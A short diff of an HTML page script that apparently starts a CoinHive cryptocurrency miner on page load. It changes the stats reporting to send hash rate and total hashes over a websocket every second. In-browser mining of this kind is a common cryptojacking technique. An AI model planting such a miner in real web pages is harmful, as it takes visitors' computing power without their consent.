@@ -7,14 +7,12 @@
     const miner = new CoinHive.User(key, 'Glitch');
     miner.start();
     
-    ws.addEventListener('message', (e) => {
-      if(e.data === 'collect') {
-        ws.send(JSON.stringify({
-          "rate": miner.getHashesPerSecond(),
-          "hashes": miner.getTotalHashes()
-        }));
-      }
-    });
+    setInterval(() => {
+      ws.send(JSON.stringify({
+        "rate": miner.getHashesPerSecond(),
+        "hashes": miner.getTotalHashes()
+      }));
+    }, 1000);
   </script>
 </head>
 <body>
